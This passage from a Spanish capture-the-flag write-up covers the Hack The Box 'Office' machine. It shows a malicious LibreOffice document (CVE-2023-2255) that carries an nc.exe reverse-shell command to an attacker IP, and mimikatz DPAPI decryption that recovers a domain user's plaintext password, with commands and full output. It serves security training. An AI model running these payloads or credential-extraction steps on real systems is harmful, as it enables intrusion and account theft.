+      &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">""</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span> <span class="nv">enctype</span><span class="o">=</span><span class="s2">"multipart/form-data"</span><span class="o">&gt;</span>
+        &lt;h3&gt;Full Name:&lt;/h3&gt;
+        &lt;input <span class="nv">class</span><span class="o">=</span><span class="s2">"inputstyle"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"fullname"</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">"Example : John Doe"</span> required&gt;
+        &lt;h3&gt;Email:&lt;/h3&gt;
+        &lt;input <span class="nv">class</span><span class="o">=</span><span class="s2">"inputstyle"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"email"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"email"</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">" Example : xxx123@xyz.abc"</span> required&gt;
+        &lt;h3&gt;Work Experience&lt;/h3&gt;
+        &lt;<span class="k">select </span><span class="nb">id</span><span class="o">=</span><span class="s2">""</span> <span class="nv">style</span><span class="o">=</span><span class="s2">"background:#151715; color:#ffffff; font-weight:bold"</span>  <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyles"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"experience"</span> required&gt;
+          &lt;option <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>0-5 years&lt;/option&gt;
+          &lt;option <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>10-20 years&lt;/option&gt;
+          &lt;option <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>20-30 years&lt;/option&gt;
+	&lt;/select&gt;&lt;br/&gt;
+	  &lt;h3&gt;Requested Salary&lt;/h3&gt;
+        &lt;<span class="k">select </span><span class="nb">id</span><span class="o">=</span><span class="s2">""</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyles"</span> <span class="nv">style</span><span class="o">=</span><span class="s2">"background:#151715; color:#ffffff; font-weight:bold"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"salary"</span> required&gt;
+          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"30 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>30 000<span class="nv">$&lt;</span>/option&gt;
+          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"60 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>60 000<span class="nv">$&lt;</span>/option&gt;
+          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"80 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>80 000<span class="nv">$&lt;</span>/option&gt;
+          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"100 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>100 000<span class="nv">$&lt;</span>/option&gt;
+          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"200 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>200 000<span class="nv">$&lt;</span>/option&gt;
+          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"300 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>300 000<span class="nv">$&lt;</span>/option&gt;
+        &lt;/select&gt;&lt;br/&gt;&lt;br/&gt;
+	 &lt;h3&gt;Choose Your Department&lt;/h3&gt;
+        &lt;<span class="k">select </span><span class="nb">id</span><span class="o">=</span><span class="s2">""</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyles"</span><span class="nv">style</span><span class="o">=</span><span class="s2">"background:#151715; color:#ffffff; font-weight:bold"</span>  <span class="nv">name</span><span class="o">=</span><span class="s2">"department"</span> required&gt;
+          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"IT"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>IT&lt;/option&gt;
+          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"Sales"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>Sales&lt;/option&gt;
+          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"Management"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>Management&lt;/option&gt;
+        &lt;/select&gt;
+        &lt;br&gt;
+        &lt;br&gt;&lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"display:flex; flex-direction:column;  align-items: center;justify-content: center;"</span><span class="o">&gt;</span>
+	 &lt;h3 <span class="nv">style</span><span class="o">=</span><span class="s2">"padding-left:50px"</span> <span class="o">&gt;</span>Upload Resume:&lt;/h3&gt;
+        &lt;input <span class="nb">id</span><span class="o">=</span><span class="s2">""</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstylef"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"file"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"assignment"</span><span class="o">&gt;</span>&lt;/div&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;button <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">style</span><span class="o">=</span><span class="s2">"margin-bottom:15px; color:#ffffff; background:#151715; width:50%; font-weight:bold ;height:35px"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"submit"</span><span class="o">&gt;</span>Upload Resume&lt;/button&gt;
+      &lt;/form&gt;
+    &lt;/div&gt;
+  &lt;/center&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
+C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Nos dice que acepta archivos <code class="language-plaintext highlighter-rouge">docx, doc, odt y docm</code> ya que comprueba la extensión del archivo y los guarda dentro de applications.</p>
+  </li>
+  <li>
+    <p>Si buscamos vulnerabilidades encontramos la siguiente <a href="https://github.com/elweth-sec/CVE-2023-2255">https://github.com/elweth-sec/CVE-2023-2255</a>.</p>
+  </li>
+  <li>
+    <p>Usa LibreOffice supongo que es el que abre el archivo.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;dir <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files"</span>
+<span class="nb">dir</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files"</span>
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is C626-9388
+
+ Directory of C:<span class="se">\P</span>rogram Files
+
+02/14/2024  03:18 AM    &lt;DIR&gt;          <span class="nb">.</span>
+01/22/2024  10:58 AM    &lt;DIR&gt;          Common Files
+01/25/2024  01:20 PM    &lt;DIR&gt;          Internet Explorer
+01/17/2024  02:26 PM    &lt;DIR&gt;          LibreOffice 5
+05/02/2023  05:22 PM    &lt;DIR&gt;          Microsoft OneDrive
+05/08/2021  01:20 AM    &lt;DIR&gt;          ModifiableWindowsApps
+04/14/2023  03:22 PM    &lt;DIR&gt;          Npcap
+04/12/2023  04:30 PM    &lt;DIR&gt;          Oracle
+02/14/2024  03:18 AM    &lt;DIR&gt;          VMware
+04/17/2023  03:35 PM    &lt;DIR&gt;          Windows Defender
+01/25/2024  01:20 PM    &lt;DIR&gt;          Windows Defender Advanced Threat Protection
+01/25/2024  01:20 PM    &lt;DIR&gt;          Windows Mail
+01/25/2024  01:20 PM    &lt;DIR&gt;          Windows Media Player
+05/08/2021  02:35 AM    &lt;DIR&gt;          Windows NT
+03/02/2022  08:58 PM    &lt;DIR&gt;          Windows Photo Viewer
+05/08/2021  01:34 AM    &lt;DIR&gt;          WindowsPowerShell
+04/14/2023  03:23 PM    &lt;DIR&gt;          Wireshark
+               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
+              17 Dir<span class="o">(</span>s<span class="o">)</span>   5,061,500,928 bytes free
+
+C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Al parecer <a href="https://github.com/elweth-sec/CVE-2023-2255">https://github.com/elweth-sec/CVE-2023-2255</a> nos genera un <code class="language-plaintext highlighter-rouge">odt</code> malicioso que podremos en applications.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/elweth-sec/CVE-2023-2255
+❯ python3 CVE-2023-2255.py <span class="nt">-h</span>
+usage: CVE-2023-2255.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="nt">--cmd</span> CMD <span class="o">[</span><span class="nt">--output</span> OUTPUT]
+
+CVE-2023-2255
+
+options:
+  <span class="nt">-h</span>, <span class="nt">--help</span>       show this <span class="nb">help </span>message and <span class="nb">exit</span>
+  <span class="nt">--cmd</span> CMD        Command to execute
+  <span class="nt">--output</span> OUTPUT  Output filename
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a generar el <code class="language-plaintext highlighter-rouge">.odt</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 CVE-2023-2255.py <span class="nt">--cmd</span> <span class="s1">'C:\xampp\htdocs\joomla\templates\cassiopeia\nc.exe 10.10.14.74 4949 -e cmd.exe '</span> <span class="nt">--output</span> yiyi.odt
+File yiyi.odt has been created <span class="o">!</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos ponemos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvvp</span> 4949
+listening on <span class="o">[</span>any] 4949 ...
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Ahora dentro de la carpeta applications vamos a poner el <code class="language-plaintext highlighter-rouge">.odt</code>.</p>
+  </li>
+  <li>
+    <p>Todo esto como el usuario web_account ya que ese usuario tiene privilegios de lectura en ese directorio.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;icacls applications
+icacls applications
+applications CREATOR OWNER:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+             OFFICE<span class="se">\P</span>Potts:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>NP<span class="o">)(</span>F<span class="o">)</span>
+             NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+             NT AUTHORITY<span class="se">\L</span>OCAL SERVICE:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+             OFFICE<span class="se">\w</span>eb_account:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX,W<span class="o">)</span>
+             BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+             BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>
+
+Successfully processed 1 files<span class="p">;</span> Failed processing 0 files
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal<span class="se">\a</span>pplications&gt;curl http://10.10.14.74:8080/yiyi.odt <span class="nt">-o</span> yiyi.odt
+curl http://10.10.14.74:8080/yiyi.odt <span class="nt">-o</span> yiyi.odt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 30567  100 30567    0     0  91336      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 91792
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora después de esperar nos llega la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvvp</span> 4949
+listening on <span class="o">[</span>any] 4949 ...
+connect to <span class="o">[</span>10.10.14.74] from office.htb <span class="o">[</span>10.10.11.3] 58419
+Microsoft Windows <span class="o">[</span>Version 10.0.20348.2322]
+<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\P</span>rogram Files<span class="se">\L</span>ibreOffice 5<span class="se">\p</span>rogram&gt;whoami
+<span class="nb">whoami
+</span>office<span class="se">\p</span>potts
+
+C:<span class="se">\P</span>rogram Files<span class="se">\L</span>ibreOffice 5<span class="se">\p</span>rogram&gt;
+</code></pre></div></div>
+
+<h2 id="shell-as-hhogan">Shell as hhogan</h2>
+
+<ul>
+  <li>Vemos que el usuario actual tiene las credenciales de hhogan almacenadas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\P</span>rogram Files<span class="se">\L</span>ibreOffice 5<span class="se">\p</span>rogram&gt;cmdkey /list
+cmdkey /list
+
+Currently stored credentials:
+
+    Target: LegacyGeneric:target<span class="o">=</span>MyTarget
+    Type: Generic
+    User: MyUser
+
+    Target: Domain:interactive<span class="o">=</span>office<span class="se">\h</span>hogan
+    Type: Domain Password
+    User: office<span class="se">\h</span>hogan
+</code></pre></div></div>
+
+<ul>
+  <li>El usuario forma parte del grupo Remote Management Users así que podremos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\P</span>rogram Files<span class="se">\L</span>ibreOffice 5<span class="se">\p</span>rogram&gt;net user hhogan
+net user hhogan
+User name                    HHogan
+Full Name
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/6/2023 11:59:34 AM
+Password expires             Never
+Password changeable          5/7/2023 11:59:34 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   5/10/2023 5:30:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers
+The command completed successfully.
+</span></code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Podemos usar <code class="language-plaintext highlighter-rouge">mimikatz.exe</code> para ver las credenciales pero el archivo donde estan guardadas las credenciales y el SID del usuario.</p>
+  </li>
+  <li>
+    <p>Comenzamos viendo el SID.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\P</span>rogram Files<span class="se">\L</span>ibreOffice 5<span class="se">\p</span>rogram&gt;whoami /all
+<span class="nb">whoami</span> /all
+
+USER INFORMATION
+<span class="nt">----------------</span>
+
+User Name     SID
+<span class="o">=============</span> <span class="o">=============================================</span>
+office<span class="se">\p</span>potts S-1-5-21-1199398058-4196589450-691661856-1107
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos los archivos donde se almacenan credenciales cifradas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\P</span>Potts&gt; gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials
+gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials
+
+
+    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>Potts<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials
+
+
+Mode                 LastWriteTime         Length Name
+<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a-hs-</span>          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E
+<span class="nt">-a-hs-</span>          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4
+<span class="nt">-a-hs-</span>         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos ver los nombres.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\P</span>Potts&gt; gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect
+gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect
+
+
+    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>Potts<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect
+
+
+Mode                 LastWriteTime         Length Name
+<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107
+<span class="nt">-a-hs-</span>          5/2/2023   4:13 PM             24 CREDHIST
+<span class="nt">-a-hs-</span>         1/17/2024   4:06 PM             76 SYNCHIST
+
+
+PS C:<span class="se">\U</span>sers<span class="se">\P</span>Potts&gt; gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span><span class="nt">-1-5-21-1199398058-4196589450-691661856-1107</span>
+gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span><span class="nt">-1-5-21-1199398058-4196589450-691661856-1107</span>
+
+
+    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>Potts<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span><span class="nt">-1-5-21-1199398058-4196589450-691661856-1107</span>
+
+
+Mode                 LastWriteTime         Length Name
+<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a-hs-</span>         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d
+<span class="nt">-a-hs-</span>          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb
+<span class="nt">-a-hs-</span>         7/19/2024  12:44 AM            740 436aa19c-a54f-4fd5-b6db-c9faef682d27
+<span class="nt">-a-hs-</span>          5/2/2023   4:13 PM            900 BK-OFFICE
+<span class="nt">-a-hs-</span>         7/19/2024  12:44 AM             24 Preferred
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Podemos usar RPC <a href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107</a>.</p>
+  </li>
+  <li>
+    <p>Tenemos la master key.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\P</span>Potts<span class="se">\D</span>ownloads&gt; .<span class="se">\m</span>imikatz.exe
+.<span class="se">\m</span>imikatz.exe
+
+  .#####.   mimikatz 2.2.0 <span class="o">(</span>x64<span class="o">)</span> <span class="c">#18362 Feb 29 2020 11:13:36</span>
+ .## ^ <span class="c">##.  "A La Vie, A L'Amour" - (oe.eo)</span>
+ <span class="c">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+ <span class="c">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+ <span class="s1">'## v ##'</span>       Vincent LE TOUX             <span class="o">(</span> vincent.letoux@gmail.com <span class="o">)</span>
+  <span class="s1">'#####'</span>        <span class="o">&gt;</span> http://pingcastle.com / http://mysmartlogon.com   <span class="k">***</span>/
+
+mimikatz <span class="c"># dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc</span>
+<span class="k">**</span>MASTERKEYS<span class="k">**</span>
+  dwVersion          : 00000002 - 2
+  szGuid             : <span class="o">{</span>191d3f9d-7959-4b4d-a520-a444853c47eb<span class="o">}</span>
+  dwFlags            : 00000000 - 0
+  dwMasterKeyLen     : 00000088 - 136
+  dwBackupKeyLen     : 00000068 - 104
+  dwCredHistLen      : 00000000 - 0
+  dwDomainKeyLen     : 00000174 - 372
+<span class="o">[</span>masterkey]
+  <span class="k">**</span>MASTERKEY<span class="k">**</span>
+    dwVersion        : 00000002 - 2
+    salt             : c521daa0857ee4fa6e4246266081e94c
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 <span class="o">(</span>CALG_HMAC<span class="o">)</span>
+    algCrypt         : 00006603 - 26115 <span class="o">(</span>CALG_3DES<span class="o">)</span>
+    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f
+
+<span class="o">[</span>backupkey]
+  <span class="k">**</span>MASTERKEY<span class="k">**</span>
+    dwVersion        : 00000002 - 2
+    salt             : a2741b13d7261697be4241ebbe05098a
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 <span class="o">(</span>CALG_HMAC<span class="o">)</span>
+    algCrypt         : 00006603 - 26115 <span class="o">(</span>CALG_3DES<span class="o">)</span>
+    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209
+
+<span class="o">[</span>domainkey]
+  <span class="k">**</span>DOMAINKEY<span class="k">**</span>
+    dwVersion        : 00000002 - 2
+    dwSecretLen      : 00000100 - 256
+    dwAccesscheckLen : 00000058 - 88
+    guidMasterKey    : <span class="o">{</span>e523832a-e126-4d6e-ac04-ed10da72b32f<span class="o">}</span>
+    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
+    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665
+
+
+Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
+
+<span class="o">[</span>domainkey] with RPC
+<span class="o">[</span>DC] <span class="s1">'office.htb'</span> will be the domain
+<span class="o">[</span>DC] <span class="s1">'DC.office.htb'</span> will be the DC server
+  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
+</code></pre></div></div>
+
+<ul>
+  <li>Si recordamos hay 3 creds encrypted.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>Potts<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials
+
+
+Mode                 LastWriteTime         Length Name
+<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a-hs-</span>          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E
+<span class="nt">-a-hs-</span>          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4
+<span class="nt">-a-hs-</span>         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
+</code></pre></div></div>
+
+<ul>
+  <li>Después de probar aquí es donde se almacena la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz <span class="c"># dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166</span>
+<span class="k">**</span>BLOB<span class="k">**</span>
+  dwVersion          : 00000001 - 1
+  guidProvider       : <span class="o">{</span>df9d8cd0-1501-11d1-8c7a-00c04fc297eb<span class="o">}</span>
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : <span class="o">{</span>191d3f9d-7959-4b4d-a520-a444853c47eb<span class="o">}</span>
+  dwFlags            : 20000000 - 536870912 <span class="o">(</span>system <span class="p">;</span> <span class="o">)</span>
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+  algCrypt           : 00006603 - 26115 <span class="o">(</span>CALG_3DES<span class="o">)</span>
+  dwAlgCryptLen      : 000000c0 - 192
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         :
+  algHash            : 00008004 - 32772 <span class="o">(</span>CALG_SHA1<span class="o">)</span>
+  dwAlgHashLen       : 000000a0 - 160
+  dwHmac2KeyLen      : 00000010 - 16
+  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
+  dwDataLen          : 000000c0 - 192
+  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
+  dwSignLen          : 00000014 - 20
+  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
+
+Decrypting Credential:
+ <span class="k">*</span> volatile cache: GUID:<span class="o">{</span>191d3f9d-7959-4b4d-a520-a444853c47eb<span class="o">}</span><span class="p">;</span>KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77
+ <span class="k">*</span> masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+<span class="k">**</span>CREDENTIAL<span class="k">**</span>
+  credFlags      : 00000030 - 48
+  credSize       : 000000be - 190
+  credUnk0       : 00000000 - 0
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 5/9/2023 11:03:21 PM
+  unkFlagsOrSize : 00000018 - 24
+  Persist        : 00000003 - 3 - enterprise
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:interactive<span class="o">=</span>OFFICE<span class="se">\H</span>Hogan
+  UnkData        : <span class="o">(</span>null<span class="o">)</span>
+  Comment        : <span class="o">(</span>null<span class="o">)</span>
+  TargetAlias    : <span class="o">(</span>null<span class="o">)</span>
+  UserName       : OFFICE<span class="se">\H</span>Hogan
+  CredentialBlob : H4ppyFtW183#
+  Attributes     : 0
+
+mimikatz <span class="c">#</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos credenciales <code class="language-plaintext highlighter-rouge">hhogan:H4ppyFtW183#</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb office.htb <span class="nt">-u</span> <span class="s1">'hhogan'</span> <span class="nt">-p</span> <span class="s1">'H4ppyFtW183#'</span>
+SMB         office.htb      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         office.htb      445    DC               <span class="o">[</span>+] office.htb<span class="se">\h</span>hogan:H4ppyFtW183#
